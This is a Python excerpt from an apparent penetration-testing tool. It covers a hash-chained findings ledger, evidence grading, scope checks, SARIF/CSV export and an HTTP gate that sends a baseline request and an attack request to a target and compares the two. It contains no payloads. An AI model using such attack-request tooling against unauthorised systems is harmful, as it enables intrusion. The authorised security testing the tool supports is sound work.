    "MASSASSIGN": ("WSTG-BUSL-02", "CWE-915", "T1068"),
    "INJECTION": ("WSTG-INPV-05", "CWE-89", "T1190"),
    "AUTHN": ("WSTG-ATHN-01", "CWE-287", "T1111"),
    "BIZLOGIC": ("WSTG-BUSL-01", "CWE-840", "T1565"),
    "SSRF": ("WSTG-INPV-10", "CWE-918", "T1190"),
    "TRAVERSAL": ("WSTG-PATH-01", "CWE-22", "T1005"),
    "REPLAY": ("WSTG-BUSL-06", "CWE-294", "T1550"),
    "HARVEST": ("WSTG-CONF-04", "CWE-530", "T1552"),
    "XSS": ("WSTG-INPV-02", "CWE-79", "T1189"),
    "REDIRECT": ("WSTG-INPV-06", "CWE-601", "T1190"),
    "CRYPTO": ("WSTG-CRYP", "CWE-326", "T1040"),
    "NETWORK": ("PTES-NET", "CWE-284", "T1046"),
    "DOMTAKE": ("WSTG-CONF-09", "CWE-350", "T1584"),
    "DIRECTORY": ("WSTG-CONF-03", "CWE-548", "T1083"),
}


def _norm_title(t):
    words = re.sub(r"[^a-z0-9 ]", " ", (t or "").lower()).split()
    return " ".join(w for w in words if w not in _STOP)[:6]


def _dedupe_key(cls, asset, title):
    from urllib.parse import urlsplit
    a = (asset or "").strip().lower()
    if "://" in a:
        sp = urlsplit(a)
        a = f"{sp.scheme}://{sp.netloc}{sp.path}".rstrip("/")
    return f"{(cls or '').upper()}|{a}|{_norm_title(title)}"


def _ledger_path(c) -> Path:
    return _camp(c) / "ledger.jsonl"


def _ledger_read_unlocked(ld: Path) -> tuple[list[dict], list[str]]:
    rows, errors = [], []
    if not ld.exists():
        return rows, errors
    for n, line in enumerate(ld.read_text(errors="replace").splitlines(), 1):
        if not line.strip():
            continue
        try:
            row = json.loads(line)
            if not isinstance(row, dict) or not row.get("id"):
                raise ValueError("not a finding object")
            rows.append(row)
        except Exception as e:
            errors.append(f"line {n}: {e}")
    return rows, errors


def _ledger_load(c) -> list[dict]:
    rows, _ = _ledger_read_unlocked(_ledger_path(c))
    return rows


def _entry_hash(entry: dict) -> str:
    base = {k: v for k, v in entry.items() if k not in ("hash", "prev")}
    base["prev"] = entry.get("prev", "")
    return _sha(json.dumps(base, sort_keys=True, separators=(",",":"), ensure_ascii=False))


def _ledger_rehash(rows: list[dict]) -> None:
    prev = ""
    for r in rows:
        r["v"] = 2
        r["prev"] = prev
        r["hash"] = _entry_hash(r)
        prev = r["hash"]


@contextlib.contextmanager
def _file_lock(path: Path):
    lock = path.with_name(path.name + ".lock")
    lock.parent.mkdir(parents=True, exist_ok=True)
    fh = lock.open("a+")
    try:
        try:
            import fcntl
            fcntl.flock(fh.fileno(), fcntl.LOCK_EX)
        except Exception:
            pass
        yield
    finally:
        try:
            import fcntl
            fcntl.flock(fh.fileno(), fcntl.LOCK_UN)
        except Exception:
            pass
        fh.close()


def _ledger_mutate(c, fn):
    ld = _ledger_path(c)
    with _file_lock(ld):
        rows, errors = _ledger_read_unlocked(ld)
        if errors:
            raise UsageError(f"refusing to rewrite a corrupt ledger: {errors[0]}")
        result = fn(rows)
        _ledger_rehash(rows)
        _atomic_write(ld, "\n".join(json.dumps(r, ensure_ascii=False) for r in rows) + "\n",
                      mode=0o600)
    return result


def _ledger_integrity(c) -> list[str]:
    """Return hard integrity errors (tamper, duplicate ids, broken chain)."""
    d = _ledger_integrity_details(c)
    return d["errors"]


def _ledger_integrity_details(c) -> dict:
    ld = _ledger_path(c)
    rows, parse_errors = _ledger_read_unlocked(ld)
    errors = list(parse_errors)
    unsigned = 0
    ids, keys = set(), {}
    prev = ""
    for i, r in enumerate(rows):
        rid = r.get("id")
        if rid in ids:
            errors.append(f"duplicate id {rid}")
        ids.add(rid)
        key = r.get("dedupe") or _dedupe_key(r.get("cls", ""), r.get("asset", ""),
                                             r.get("title", ""))
        if key in keys:
            errors.append(f"duplicate dedupe key {key!r} ({keys[key]} and {rid})")
        keys[key] = rid
        if not r.get("hash"):
            unsigned += 1
            prev = ""
            continue
        if r.get("prev", "") != prev:
            errors.append(f"{rid}: broken hash chain (prev mismatch)")
        if r["hash"] != _entry_hash(r):
            errors.append(f"{rid}: content hash mismatch (tampered)")
        prev = r["hash"]
    return {"errors": errors, "rows": len(rows), "unsigned": unsigned,
            "signed": len(rows) - unsigned}


def _next_id(rows: list[dict]) -> str:
    nums = [int(m.group(1)) for r in rows
            if (m := re.search(r"(\d+)$", str(r.get("id", ""))))]
    return f"SPY-{(max(nums) + 1) if nums else 1:03d}"


def _evidence_sections(proof: str) -> dict:
    sections, matches = {}, list(re.finditer(r"(?i)\b(baseline|attack|diff)\s*:\s*", proof or ""))
    for i, m in enumerate(matches):
        end = matches[i + 1].start() if i + 1 < len(matches) else len(proof)
        sections[m.group(1).lower()] = proof[m.end():end].strip(" ;\n\t")
    return sections


def _evidence_gate(proof: str) -> tuple[str, float, str | None]:
    """A finding is CONFIRMED only when the proof carries three non-empty
    sections: baseline, attack and a measurable diff. Everything else is
    DOWNGRADED to hypothesis — never suppressed."""
    s = _evidence_sections(proof)
    missing = [k for k in ("baseline", "attack", "diff") if len(s.get(k, "")) < 2]
    if not missing:
        return "confirmed", 0.95, None
    if "diff" in s and len(s["diff"]) >= 2:
        return "hypothesis", 0.4, (
            "evidence incomplete: need non-empty baseline: + attack: (missing "
            + ", ".join(missing) + ")")
    return "hypothesis", 0.4, "no 3-gate evidence: need baseline: + attack: + diff:"


def _impact_to_severity(title, proof):
    """Triager check material: does the claimed severity match the impact words?"""
    text = f"{title} {proof}".lower()
    if re.search(r"\b(rce|remote code|command exec|full.?bypass|account takeover|mass data|sql inject.*data)\b", text):
        return "critical"
    if re.search(r"\b(user|email|token|key|password|secret|admin|session|cookie|api.?key|credential)\b", text):
        return "high"
    if re.search(r"\b(version|fingerprint|header|stack trace|error message|debug|info disclosure)\b", text):
        return "info"
    return "medium"


def _default_bindings(cls: str, title: str) -> tuple[str, str, str]:
    c = (cls or "").upper()
    if c in CLASS_BINDINGS:
        return CLASS_BINDINGS[c]
    for key, val in CLASS_BINDINGS.items():
        if key.lower() in (title or "").lower():
            return val
    return ("", "", "")


def _severity_from_cvss(score: float) -> str:
    if score >= 9.0:
        return "critical"
    if score >= 7.0:
        return "high"
    if score >= 4.0:
        return "medium"
    if score > 0:
        return "low"
    return "info"


def _entry_new(rows, title, cls, asset, severity, proof, cwe=None,
               cvss=None, attack=None, wstg=None, status=None, confidence=None,
               request_meta=None, evidence_quality="3-gate",
               force_status=None) -> dict:
    cls = (cls or "GENERAL").upper()
    status, conf, _ = _evidence_gate(proof)
    if status != "confirmed":
        confidence = 0.4
    elif confidence is None:
        confidence = conf
    if force_status:
        status = force_status.lower()
        confidence = 0.4 if status != "confirmed" else (confidence or 0.95)
    sev = severity or _impact_to_severity(title, proof)
    if cvss is None:
        cvss = SEVERITY_SCORE.get(sev, 5.5)
    d_wstg, d_cwe, d_attack = _default_bindings(cls, title)
    return {
        "v": 2,
        "id": _next_id(rows),
        "title": title,
        "cls": cls,
        "asset": asset,
        "severity": sev,
        "cvss": round(float(cvss), 1),
        "status": status.upper(),
        "confidence": round(float(confidence if confidence is not None else conf), 2),
        "evidence_quality": evidence_quality,
        "proof": proof,
        "cwe": cwe or d_cwe,
        "wstg": wstg or d_wstg,
        "attack": attack or d_attack,
        "dedupe": _dedupe_key(cls, asset, title),
        "evidence": [{"proof": proof, "at": _now(), "sha256": _sha(proof)}],
        "request": request_meta or {},
        "at": _now(),
        "updated": _now(),
    }


def _priors_learn(cls: str, hits: int, runs: int) -> None:
    """THE SHARED WEIGHT STORE — per-class hit rates every mandate reads.
    Real engagements (non-lab ledger rows) write here; self-play (train) writes
    the same file directly. Merges atomically; never fails a ledger write."""
    cls = (cls or "").upper()
    if not cls:
        return
    try:
        pr = _priors()
        d = pr.setdefault(cls, {"hits": 0, "runs": 0})
        d["hits"] = d.get("hits", 0) + hits
        d["runs"] = d.get("runs", 0) + runs
        MEM_ROOT.mkdir(parents=True, exist_ok=True)
        _atomic_write(MEM_ROOT / "spydermonkey-priors.json",
                      json.dumps(pr, indent=2) + "\n")
    except Exception:
        pass  # priors are advisory — the ledger write must never fail for them


def _ledger_register(c, title, cls, asset, severity=None, proof="", cwe=None,
                     cvss=None, attack=None, wstg=None,
                     require_scope=True, dry_run=False, **kw) -> dict:
    if require_scope and not _is_lab(asset):
        try:
            scope = sa.load_scope()
        except sa.ScopeError as e:
            raise ScopeDenied(f"LEDGER REFUSED — scope authority is unreadable: {e}") from e
        if scope is None:
            raise ScopeDenied(
                f"LEDGER REFUSED — no scope authority for {asset} (scope init first)")
        ok, reason = sa.match(scope, asset)
        if not ok:
            raise ScopeDenied(f"LEDGER REFUSED — {asset}: {reason}")
    result = {}
    force_status = kw.get("force_status")

    def mutate(rows):
        key = _dedupe_key(cls, asset, title)
        dup = next((r for r in rows
                    if (r.get("dedupe") or _dedupe_key(r.get("cls", ""),
                                                       r.get("asset", ""),
                                                       r.get("title", ""))) == key), None)
        status, conf, reason = _evidence_gate(proof)
        if force_status and force_status.lower() != "confirmed":
            status, conf = force_status.lower(), 0.4
        if dup:
            dup.setdefault("evidence", []).append(
                {"proof": proof, "at": _now(), "sha256": _sha(proof)})
            if status == "confirmed" and dup.get("status") != "CONFIRMED":
                dup["status"], dup["confidence"] = "CONFIRMED", conf
                dup["evidence_quality"] = "3-gate"
                if not _is_lab(dup.get("asset", asset)):
                    _priors_learn(cls, 1, 1)
            elif force_status and force_status.lower() != "confirmed" \
                    and dup.get("status") != "CONFIRMED":
                dup["status"], dup["confidence"] = force_status.upper(), 0.4
            dup["updated"] = _now()
            if cvss is not None:
                dup["cvss"] = round(float(cvss), 1)
            result.update({"entry": dup, "duplicate": True, "reason": reason,
                           "status": dup.get("status"), "confidence": dup.get("confidence")})
            return
        entry = _entry_new(rows, title, cls, asset, severity, proof, cwe,
                           cvss, attack, wstg, **kw)
        rows.append(entry)
        if not _is_lab(asset):
            _priors_learn(cls, 1 if entry["status"] == "CONFIRMED" else 0, 1)
        result.update({"entry": entry, "duplicate": False, "reason": reason,
                       "status": entry["status"], "confidence": entry["confidence"]})

    if dry_run:
        rows = _ledger_load(c)
        key = _dedupe_key(cls, asset, title)
        dup = next((r for r in rows
                    if (r.get("dedupe") or _dedupe_key(r.get("cls", ""),
                                                       r.get("asset", ""),
                                                       r.get("title", ""))) == key), None)
        entry = dup or _entry_new(rows, title, cls, asset, severity, proof, cwe,
                                  cvss, attack, wstg, **kw)
        return {"entry": entry, "duplicate": bool(dup), "dry_run": True,
                "status": entry.get("status"), "confidence": entry.get("confidence"),
                "reason": _evidence_gate(proof)[2]}
    _ledger_mutate(c, mutate)
    return result


def _cmd_ledger_internal(target, title, cls, asset, severity, proof, cwe=None,
                         force_hypothesis=False, quiet=False, **kw):
    """Register a finding through the ledger's own gates (used by gate/testers)."""
    if force_hypothesis:
        proof = proof + "\ncontrol: differential is not specific (hypothesis-grade)"
    res = _ledger_register(target, title, cls, asset, severity, proof, cwe,
                           force_status="hypothesis" if force_hypothesis else None,
                           **kw)
    e = res["entry"]
    if not quiet:
        if res["duplicate"]:
            print(f"  ▸ ledger: evidence attached to {e['id']} (dedupe)")
        else:
            print(f"  ▸ ledger: {e['id']} [{res['status']} {e['severity']}"
                  f" conf={e['confidence']:.2f}] {title[:52]}")
        if res.get("reason"):
            print(f"    ⚠ downgraded (never suppressed): {res['reason']}")
    _event(target, "ledger.add", f"{e['id']} {res['status']} {title[:80]}",
           cls=cls, asset=asset)
    return e


def _ledger_rows_filtered(rows, args) -> list[dict]:
    out = rows
    statuses = {s.upper() for s in _split_values(getattr(args, "status", None))}
    if statuses:
        out = [r for r in out if r.get("status") in statuses]
    clss = {s.upper() for s in _split_values(getattr(args, "cls_filter", None))}
    if clss:
        out = [r for r in out if (r.get("cls") or "").upper() in clss]
    sevs = {s.lower() for s in _split_values(getattr(args, "severity", None))}
    if sevs:
        out = [r for r in out if (r.get("severity") or "").lower() in sevs]
    q = (getattr(args, "search", None) or "").lower().strip()
    if q:
        out = [r for r in out if q in json.dumps(r).lower()]
    sort = getattr(args, "sort", "id") or "id"
    keys = {
        "id": lambda r: r.get("id", ""),
        "severity": lambda r: SEVERITY_ORDER.get(r.get("severity", "medium"), 2),
        "cvss": lambda r: float(r.get("cvss") or 0),
        "confidence": lambda r: float(r.get("confidence") or 0),
        "class": lambda r: r.get("cls", ""),
        "updated": lambda r: r.get("updated", r.get("at", "")),
    }
    out = sorted(out, key=keys.get(sort, keys["id"]), reverse=sort in
                 ("severity", "cvss", "confidence"))
    limit = getattr(args, "limit", None)
    return out[:limit] if limit else out


def _ledger_stats(rows) -> dict:
    by_status, by_sev, by_cls = {}, {}, {}
    for r in rows:
        by_status[r.get("status", "?")] = by_status.get(r.get("status", "?"), 0) + 1
        by_sev[r.get("severity", "?")] = by_sev.get(r.get("severity", "?"), 0) + 1
        by_cls[r.get("cls", "?")] = by_cls.get(r.get("cls", "?"), 0) + 1
    conf = [r for r in rows if r.get("status") == "CONFIRMED"]
    scores = [float(r.get("cvss") or 0) for r in rows]
    risk = round(sum(SEVERITY_SCORE.get(r.get("severity", "medium"), 5.5)
                     for r in rows if r.get("status") in ("CONFIRMED", "HYPOTHESIS")), 1)
    return {"rows": len(rows), "confirmed": len(conf),
            "confirmed_ratio": round(len(conf) / len(rows), 3) if rows else 0.0,
            "by_status": by_status, "by_severity": by_sev, "by_class": by_cls,
            "cvss_avg": round(sum(scores) / len(scores), 2) if scores else 0.0,
            "cvss_max": max(scores) if scores else 0.0,
            "risk_score": risk,
            "oldest": min((r.get("at", "") for r in rows), default=""),
            "newest": max((r.get("updated", r.get("at", "")) for r in rows), default="")}


def _ledger_to_sarif(target: str, rows: list[dict]) -> dict:
    rules, rule_ids = [], {}
    for r in rows:
        rid = f"{(r.get('cls') or 'GENERAL').upper()}-{(r.get('cwe') or 'CWE-200')}"
        if rid not in rule_ids:
            rule_ids[rid] = len(rules)
            rules.append({
                "id": rid,
                "name": r.get("cls", "GENERAL"),
                "shortDescription": {"text": r.get("cls", "finding")},
                "properties": {"cwe": r.get("cwe", ""), "wstg": r.get("wstg", ""),
                               "attack": r.get("attack", "")},
            })
    results = []
    for r in rows:
        level = {"critical": "error", "high": "error", "medium": "warning",
                 "low": "note", "info": "note"}.get(r.get("severity"), "warning")
        rid = f"{(r.get('cls') or 'GENERAL').upper()}-{(r.get('cwe') or 'CWE-200')}"
        results.append({
            "ruleId": rid,
            "ruleIndex": rule_ids[rid],
            "level": level,
            "message": {"text": f"{r.get('title')} [{r.get('status')} conf={r.get('confidence')}]"},
            "locations": [{"physicalLocation": {"artifactLocation": {
                "uri": r.get("asset", "")}}}],
            "properties": {"confidence": r.get("confidence"),
                           "status": r.get("status"),
                           "severity": r.get("severity"),
                           "cvss": r.get("cvss"),
                           "proof": r.get("proof", "")[:800]},
        })
    return {
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": {"driver": {"name": "SPYDERMONKEY", "version": VERSION,
                                "informationUri": "https://github.com/xanstomper/spydermonkey",
                                "rules": rules}},
            "results": results,
            "properties": {"campaign": target, "generated": _now()},
        }],
    }


def cmd_ledger(args):
    camp = _camp(args.target)
    _ensure_campaign(args.target)
    action = args.action
    if action == "add":
        proof = args.proof or ""
        if getattr(args, "proof_file", None):
            try:
                proof = Path(args.proof_file).read_text()
            except OSError as e:
                print(f"✗ cannot read --proof-file: {e}", file=sys.stderr)
                return 2
        if not args.title or not args.asset:
            raise UsageError("ledger add needs --title and --asset")
        severity = args.severity
        if getattr(args, "cvss", None) is not None:
            if not 0 <= args.cvss <= 10:
                raise UsageError("--cvss must be between 0 and 10")
            severity = severity or _severity_from_cvss(args.cvss)
        severity = severity or _impact_to_severity(args.title, proof)
        res = _ledger_register(args.target, args.title, args.cls, args.asset,
                               severity, proof, args.cwe, getattr(args, "cvss", None),
                               getattr(args, "attack", None),
                               getattr(args, "wstg", None),
                               dry_run=getattr(args, "dry_run", False))
        e = res["entry"]
        payload = {"finding": e, "duplicate": res["duplicate"],
                   "reason": res.get("reason"), "dry_run": bool(getattr(args, "dry_run", False))}
        if _json_mode(args):
            _emit(args, payload)
        elif res["duplicate"]:
            print(f"▸ DUPLICATE — matched {e['id']} (same class+asset+title): evidence"
                  f" attached in place, no new record ({len(e.get('evidence', []))}"
                  f" evidence item(s))")
        else:
            print(f"▸ {e['id']} [{e['status']} {e['severity']} conf={e['confidence']:.2f}]"
                  f" {e['title'][:56]} @ {e['asset'][:40]}")
            if res.get("reason"):
                print(f"  ⚠ downgraded (never suppressed): {res['reason']}")
        if not res["duplicate"] and not getattr(args, "dry_run", False):
            _event(args.target, "ledger.add", f"{e['id']} {e['status']} {e['title'][:80]}",
                   cls=e["cls"], asset=e["asset"])
        return 0
    if action == "list":
        rows = _ledger_rows_filtered(_ledger_load(args.target), args)
        if _json_mode(args):
            _emit(args, {"target": args.target, "findings": rows, "count": len(rows)})
            return 0
        if not rows:
            print("· ledger empty (or no rows match) — ledger add --target <t> --title ..."
                  " --proof 'baseline:… attack:… diff:…'")
            return 0
        print(f"═══ FINDING LEDGER — {args.target} ({len(rows)} finding(s)) ═══")
        for r in rows:
            print(f"  {r['id']} [{r.get('status','?'):13s} {r.get('severity','?'):8s}"
                  f" cvss={float(r.get('cvss') or 0):.1f} conf={float(r.get('confidence') or 0):.2f}]"
                  f" {r.get('title','')[:52]} @ {r.get('asset','')[:44]} ({r.get('cls','')})")
        return 0
    if action == "show":
        rows = _ledger_load(args.target)
        r = next((x for x in rows if x.get("id") == args.id), None)
        if not r:
            print(f"✗ no finding {args.id}", file=sys.stderr)
            return 2
        if _json_mode(args):
            _emit(args, {"finding": r})
        else:
            print(json.dumps(r, indent=2, ensure_ascii=False))
        return 0
    if action == "triage":
        rows = _ledger_load(args.target)
        if not rows:
            if _json_mode(args):
                _emit(args, {"target": args.target, "findings": [], "blocking": [],
                             "warnings": []})
            else:
                print("· ledger empty — nothing to triage")
            return 0
        scope = _load_scope()
        blocking, warnings, items = [], [], []
        for r in rows:
            vs = []
            want = _impact_to_severity(r.get("title", ""), r.get("proof", ""))
            if SEVERITY_ORDER.get(r.get("severity", "medium"), 2) < SEVERITY_ORDER[want] - 1:
                vs.append(("severity-impact", "warning",
                           f"claims {r.get('severity')} but impact words say {want}"))
            if r.get("status") == "CONFIRMED" and _evidence_gate(r.get("proof", ""))[0] != "confirmed":
                vs.append(("evidence", "blocking",
                           "CONFIRMED without a complete 3-gate proof"))
            if r.get("status") != "CONFIRMED" and _evidence_gate(r.get("proof", ""))[0] != "confirmed":
                vs.append(("evidence", "warning", "no reproducible 3-gate evidence"))
            if scope is not None and not _is_lab(r.get("asset", "")) \
                    and not _scope_match(scope, r.get("asset", "")):
                vs.append(("scope", "blocking",
                           f"asset {r.get('asset')} out of the declared estate"))
            dups = [x.get("id") for x in rows if x.get("id") != r.get("id")
                    and x.get("dedupe") == r.get("dedupe")]
            if dups:
                vs.append(("duplicate", "warning", f"same key as {','.join(dups)}"))
            at = _parse_ts(r.get("updated") or r.get("at"))
            if at and (datetime.now(timezone.utc) - at).days > 90:
                vs.append(("stale", "warning", "older than 90 days — re-verify"))
            items.append({"id": r.get("id"), "title": r.get("title"),
                          "violations": [{"gate": g, "level": sev, "message": m}
                                         for g, sev, m in vs]})
            for g, sev, msg in vs:
                (blocking if sev == "blocking" else warnings).append(
                    f"{r.get('id')} {g}: {msg}")
            if not _json_mode(args):
                mark = "✗" if any(g == "blocking" for g, _, _ in vs) else ("⚠" if vs else "✓")
                print(f"  {mark} {r.get('id')} {r.get('title', '')[:46]} — "
                      + ("; ".join(f"{g}:{m[:44]}" for g, _, m in vs) if vs else "clean"))
        payload = {"target": args.target, "findings": items,
                   "blocking": blocking, "warnings": warnings,
                   "ok": not blocking}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"═══ {len(rows)} finding(s): {len(blocking)} blocking"
                  f" · {len(warnings)} warning(s) ═══")
            for b in blocking:
                print(f"  ✗ BLOCKING {b}")
        return 1 if blocking else 0
    if action == "verify":
        d = _ledger_integrity_details(args.target)
        strict = getattr(args, "strict", False)
        errors = list(d["errors"])
        if strict and d["unsigned"]:
            errors.append(f"{d['unsigned']} unsigned legacy row(s) — run ledger add or update to sign")
        payload = {"target": args.target, **d, "errors": errors,
                   "strict": strict, "ok": not errors}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"═══ LEDGER VERIFY — {args.target} ═══")
            print(f"  rows {d['rows']} · signed {d['signed']} · unsigned {d['unsigned']}")
            for e in errors:
                print(f"  ✗ {e}")
            print(f"═══ {'INTEGRITY OK' if not errors else 'INTEGRITY FAILED'} ═══")
        return 0 if not errors else 1
    if action == "stats":
        rows = _ledger_load(args.target)
        payload = {"target": args.target, **_ledger_stats(rows),
                   "integrity": _ledger_integrity_details(args.target)}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"═══ LEDGER STATS — {args.target} ═══")
            print(f"  findings {payload['rows']} · confirmed {payload['confirmed']}"
                  f" ({payload['confirmed_ratio'] * 100:.1f}%)")
            print(f"  severity {payload['by_severity']}")
            print(f"  status   {payload['by_status']}")
            print(f"  cvss avg {payload['cvss_avg']} · max {payload['cvss_max']}"
                  f" · risk score {payload['risk_score']}")
            print(f"  newest {payload['newest'] or '—'}")
        return 0
    if action == "export":
        rows = _ledger_load(args.target)
        fmt = (args.format or "json").lower()
        if fmt == "json":
            data = {"campaign": args.target, "generated": _now(),
                    "scope": sa.summary(_load_scope()) if _load_scope() else None,
                    "findings": rows, "stats": _ledger_stats(rows),
                    "integrity": _ledger_integrity_details(args.target)}
            text = json.dumps(data, indent=2, ensure_ascii=False) + "\n"
        elif fmt == "jsonl":
            text = "\n".join(json.dumps(r, ensure_ascii=False) for r in rows) + "\n"
        elif fmt == "csv":
            buf = io.StringIO()
            cols = ["id", "title", "cls", "asset", "severity", "cvss", "status",
                    "confidence", "cwe", "wstg", "attack", "proof", "at", "updated"]
            w = csv.DictWriter(buf, fieldnames=cols, extrasaction="ignore")
            w.writeheader()
            for r in rows:
                w.writerow(r)
            text = buf.getvalue()
        elif fmt == "markdown":
            L = [f"# Findings — {args.target}", "",
                 f"_generated {_now()} · {len(rows)} finding(s)_", "",
                 "| id | severity | cvss | status | class | title | asset |",
                 "|---|---|---|---|---|---|---|"]
            for r in rows:
                L.append(f"| {r.get('id')} | {r.get('severity')} | {r.get('cvss')} |"
                         f" {r.get('status')} | {r.get('cls')} | {str(r.get('title','')).replace('|','\\|')} |"
                         f" {str(r.get('asset','')).replace('|','\\|')} |")
            text = "\n".join(L) + "\n"
        elif fmt == "sarif":
            text = json.dumps(_ledger_to_sarif(args.target, rows), indent=2) + "\n"
        else:
            raise UsageError(f"unknown export format: {fmt} (json|jsonl|csv|markdown|sarif)")
        out = args.output or str(camp / f"findings.{ 'md' if fmt == 'markdown' else fmt }")
        if out == "-":
            print(text, end="")
        else:
            _atomic_write(Path(out), text, mode=0o600)
            if _json_mode(args):
                _emit(args, {"format": fmt, "output": out, "rows": len(rows)})
            else:
                print(f"▸ findings exported: {out} ({fmt}, {len(rows)} row(s))")
        return 0
    if action == "update":
        rows = _ledger_load(args.target)
        r = next((x for x in rows if x.get("id") == args.id), None)
        if not r:
            print(f"✗ no finding {args.id}", file=sys.stderr)
            return 2
        if args.status:
            new = args.status.upper()
            if new not in LEDGER_STATUSES:
                raise UsageError(f"status must be one of {', '.join(LEDGER_STATUSES)}")
            old = r.get("status", "HYPOTHESIS")
            if new != old and new not in STATUS_TRANSITIONS.get(old, set()):
                raise UsageError(f"illegal transition {old} → {new}")
        updated = {}

        def apply(rows2):
            for x in rows2:
                if x.get("id") != args.id:
                    continue
                if args.status:
                    x["status"] = args.status.upper()
                    if args.status.upper() == "CONFIRMED":
                        x["confidence"] = max(float(x.get("confidence") or 0), 0.95)
                if args.severity:
                    x["severity"] = args.severity
                if getattr(args, "cvss", None) is not None:
                    x["cvss"] = round(args.cvss, 1)
                x["updated"] = _now()
                if args.note:
                    x.setdefault("evidence", []).append(
                        {"note": args.note, "at": _now(), "sha256": _sha(args.note)})
                updated.update(x)
                break

        _ledger_mutate(args.target, apply)
        _event(args.target, "ledger.update",
               f"{args.id} {args.status or ''} {args.note or ''}")
        payload = {"finding": updated, "updated": True}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"▸ {args.id} updated → {updated.get('status')}"
                  f" {updated.get('severity')} cvss={updated.get('cvss')}")
        return 0
    if action == "sync":
        signals = _confirmed_rows(args.target)
        created, skipped = [], 0
        for title, cls, asset in signals:
            if not asset or asset == "?":
                skipped += 1
                continue
            existing = [r for r in _ledger_load(args.target)
                        if (r.get("dedupe") or _dedupe_key(r.get("cls", ""),
                                                            r.get("asset", ""),
                                                            r.get("title", "")))
                        == _dedupe_key(cls, asset, title)]
            if existing:
                skipped += 1
                continue
            if getattr(args, "dry_run", False):
                created.append({"title": title, "cls": cls, "asset": asset})
                continue
            res = _ledger_register(args.target, title, cls, asset, None,
                                   f"baseline: family state CONFIRMED for {asset}; "
                                   f"attack: state row '{title[:120]}'; "
                                   f"diff: engine recorded confirmation (no 3-gate replay yet)",
                                   require_scope=True)
            created.append(res["entry"])
        payload = {"target": args.target, "created": created, "skipped": skipped,
                   "dry_run": bool(getattr(args, "dry_run", False))}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"▸ ledger sync: {len(created)} created · {skipped} already present")
            for e in created[:10]:
                if isinstance(e, dict):
                    print(f"  + {e.get('id', '?')} {e.get('title', '')[:60]}"
                          f" @ {e.get('asset', '')[:40]}")
        return 0
    return 2


def _ledger_rewrite(c, rows):
    _ledger_rehash(rows)
    _atomic_write(_ledger_path(c),
                  "\n".join(json.dumps(r) for r in rows) + "\n", mode=0o600)


_MAX_BODY = 1_000_000


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


_OPENER = urllib.request.build_opener(_NoRedirect())


def _http(url, method="GET", data=None, headers=None, timeout=8):
    """Stdlib live request. Never redirects (a redirect must never walk the
    family out of scope), caps the body, honors the scope rate limit, and
    returns a structured dict. Never raises."""
    t0 = time.time()
    from urllib.parse import urlsplit as _us
    _h = (_us(url).hostname or "").lower()
    if _h not in ("127.0.0.1", "localhost", "::1", "[::1]"):
        # the rate limiter protects REMOTE estates; the loopback lab (dojo
        # replicas, CI, the demo) is never throttled — v5.5.0
        sa.rate_wait()
    body_bytes = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(url, method=method.upper(),
                                 data=body_bytes, headers=headers or {})
    try:
        with _OPENER.open(req, timeout=min(max(float(timeout), 1), 30)) as r:
            raw = r.read(_MAX_BODY + 1)
            truncated = len(raw) > _MAX_BODY
            raw = raw[:_MAX_BODY]
            return {"status": r.status, "body": raw.decode("utf-8", "replace"),
                    "headers": {k.lower(): v for k, v in r.headers.items()},
                    "elapsed": round(time.time() - t0, 3), "url": r.geturl(),
                    "truncated": truncated, "sha256": _sha(raw.decode("utf-8", "replace")),
                    "error": ""}
    except urllib.error.HTTPError as e:
        raw = e.read(_MAX_BODY + 1)[:_MAX_BODY] if e.fp else b""
        return {"status": e.code, "body": raw.decode("utf-8", "replace"),
                "headers": {k.lower(): v for k, v in (e.headers or {}).items()},
                "elapsed": round(time.time() - t0, 3), "url": url,
                "truncated": len(raw) >= _MAX_BODY, "sha256": _sha(raw.decode("utf-8", "replace")),
                "error": ""}
    except Exception as e:
        return {"status": 0, "body": f"__error__ {type(e).__name__}",
                "headers": {}, "elapsed": round(time.time() - t0, 3), "url": url,
                "truncated": False, "sha256": "", "error": f"{type(e).__name__}: {e}"}


def _gate_diff(a: dict, b: dict) -> tuple[bool, list[str]]:
    what = []
    if a["status"] != b["status"]:
        what.append(f"status {a['status']}→{b['status']}")
    if len(a["body"]) != len(b["body"]):
        what.append(f"length {len(a['body'])}→{len(b['body'])}")
    if a["body"] != b["body"]:
        what.append(f"body sha {a['sha256'][:12]}→{b['sha256'][:12]}")
    for h in ("location", "content-type", "server", "x-powered-by"):
        if a["headers"].get(h) != b["headers"].get(h):
            what.append(f"{h} differs")
    return bool(what), what


def _gate_urls(args) -> tuple[str, str]:
    sp = urllib.parse.urlsplit(args.url)
    base_q = urllib.parse.parse_qsl(sp.query, keep_blank_values=True)
    base_path = sp.path or "/"
    base_query = (urllib.parse.parse_qsl(args.baseline_query, keep_blank_values=True)
                  if args.baseline_query else base_q)
    url_b = urllib.parse.urlunsplit((sp.scheme, sp.netloc, base_path,
                                     urllib.parse.urlencode(base_query), ""))
    atk_q = urllib.parse.parse_qsl(args.attack_query, keep_blank_values=True)
    if args.append_query:
        atk_q = base_query + atk_q
    url_a = urllib.parse.urlunsplit((sp.scheme, sp.netloc, base_path,
                                     urllib.parse.urlencode(atk_q), ""))
    return url_b, url_a


def _gate_attack_data(args, url_a: str) -> str | None:
    if getattr(args, "attack_data", None) is not None:
        return args.attack_data
    if args.data and args.method.upper() in ("POST", "PUT", "PATCH", "DELETE") \
            and args.append_query:
        return args.data + "&" + url_a.split("?", 1)[-1]
    return args.data


def cmd_gate(args):
    if args.prove:
        rows = _ledger_load(args.target)
        r = next((x for x in rows if x.get("id") == args.prove), None)
        if not r:
            print(f"✗ no finding {args.prove}", file=sys.stderr)
            return 2
        integrity = _ledger_integrity_details(args.target)
        payload = {"finding": r, "integrity": integrity}
        if getattr(args, "replay", False):
            req = r.get("request") or {}
            if not req.get("baseline_url") or not req.get("attack_url"):
                payload["replay"] = {"ok": False, "error": "no stored request metadata"}
            elif not _scope_gate(req["baseline_url"]) or not _scope_gate(req["attack_url"]):
